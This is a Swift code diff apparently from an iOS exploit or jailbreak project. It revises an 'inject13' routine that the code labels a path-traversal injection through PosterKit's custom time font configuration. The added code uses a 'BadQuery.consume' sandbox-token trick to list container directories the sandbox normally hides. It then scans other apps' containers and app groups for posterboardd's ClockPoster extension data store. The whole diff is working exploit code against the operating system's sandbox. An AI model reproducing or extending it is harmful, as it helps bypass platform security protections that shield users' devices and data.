@@ -3776,7 +3776,7 @@ class SymHandler {
 
     @discardableResult
     static func inject13() -> String {
-        var diag = ["=== Inject v13-r11 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
+        var diag = ["=== Inject v13-r12 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
         let fm = FileManager.default
 
         for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
@@ -3902,7 +3902,29 @@ class SymHandler {
         let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
         diag.append("extBase contents (\(allExts.count)): \(allExts.prefix(5).joined(separator: ", "))")
 
-        // Diagnose whether this is actually posterboardd's container
+        // Confirm container identity (metadata plist carries the registered bundle ID)
+        let metaPath = container + "/.com.apple.mobile_container_manager.metadata.plist"
+        if let metaData = fm.contents(atPath: metaPath),
+           let meta = try? PropertyListSerialization.propertyList(from: metaData, format: nil) as? [String: Any] {
+            diag.append("container bundleID: \(meta["MCMMetadataIdentifier"] as? String ?? "?")")
+        } else {
+            diag.append("container metadata: unreadable (wrong UUID?)")
+        }
+
+        // Explore Library/ directly — fm.contentsOfDirectory works on paths we own
+        // even though the parent /Containers/Data/Application/ root is not listable
+        let libPath = container + "/Library"
+        let libItems = (try? fm.contentsOfDirectory(atPath: libPath)) ?? []
+        diag.append("Library/ (\(libItems.count)): \(libItems.joined(separator: ", "))")
+        for item in libItems {
+            let subItems = (try? fm.contentsOfDirectory(atPath: "\(libPath)/\(item)")) ?? []
+            if !subItems.isEmpty {
+                let interesting = subItems.filter { $0.contains("Poster") || $0.contains("PRB") || $0.contains("PBF") || $0.contains("Extension") || $0.contains("Clock") }
+                diag.append("  \(item)/: \(!interesting.isEmpty ? interesting.joined(separator: ", ") : "\(subItems.count) items")")
+            }
+        }
+
+        // Diagnose Application Support (may be empty if wrong container or not yet initialized)
         let appSupportPath = container + "/Library/Application Support"
         let appSupportItems = (try? fm.contentsOfDirectory(atPath: appSupportPath)) ?? []
         diag.append("AppSupport (\(appSupportItems.count)): \(appSupportItems.prefix(6).joined(separator: ", "))")
@@ -3921,22 +3943,30 @@ class SymHandler {
                 "/var/mobile/Containers/Data/Application",
                 "/var/mobile/Containers/Shared/AppGroup"
             ]
+            // Note: fm.contentsOfDirectory can't list container roots (POSIX read
+            // permission restricted) but bad_query consume may open that gate.
             outer: for root in scanRoots {
+                // Try bad_query consume on the root itself so readdir can proceed
+                let rootH = noSandbox ? (try? BadQuery.consume(path: root, create: false)) : nil
                 let uuids = (try? fm.contentsOfDirectory(atPath: root)) ?? []
+                rootH?.release()
                 diag.append("  \(root.components(separatedBy: "/").last ?? root): \(uuids.filter { $0.count == 36 }.count) UUIDs")
                 for u in uuids where u.count == 36 && u.contains("-") {
-                    let dsBase = "\(root)/\(u)/Library/Application Support/PRBPosterExtensionDataStore"
-                    guard fm.fileExists(atPath: dsBase) else { continue }
-                    let dsVers = (try? fm.contentsOfDirectory(atPath: dsBase)) ?? []
-                    for ver in dsVers {
-                        let candidate = "\(dsBase)/\(ver)/Extensions"
-                        let exts = (try? fm.contentsOfDirectory(atPath: candidate)) ?? []
-                        if let name = exts.first(where: { $0.contains("ClockPoster") }) {
-                            let rootLabel = root.components(separatedBy: "/").last ?? root
-                            diag.append("Found: \(rootLabel)/\(u.prefix(8)) ver=\(ver) ext=\(name.prefix(24))")
-                            clockExtBase = candidate
-                            discoveredClockExt = name
-                            break outer
+                    // Check both PRB and PBF prefix (SQLite uses PBF; dir may differ per iOS)
+                    for dsName in ["PRBPosterExtensionDataStore", "PBFPosterExtensionDataStore"] {
+                        let dsBase = "\(root)/\(u)/Library/Application Support/\(dsName)"
+                        guard fm.fileExists(atPath: dsBase) else { continue }
+                        let dsVers = (try? fm.contentsOfDirectory(atPath: dsBase)) ?? []
+                        for ver in dsVers {
+                            let candidate = "\(dsBase)/\(ver)/Extensions"
+                            let exts = (try? fm.contentsOfDirectory(atPath: candidate)) ?? []
+                            if let name = exts.first(where: { $0.contains("ClockPoster") }) {
+                                let rootLabel = root.components(separatedBy: "/").last ?? root
+                                diag.append("Found: \(rootLabel)/\(u.prefix(8)) \(dsName.prefix(3)) ver=\(ver) ext=\(name.prefix(24))")
+                                clockExtBase = candidate
+                                discoveredClockExt = name
+                                break outer
+                            }
                         }
                     }
                 }
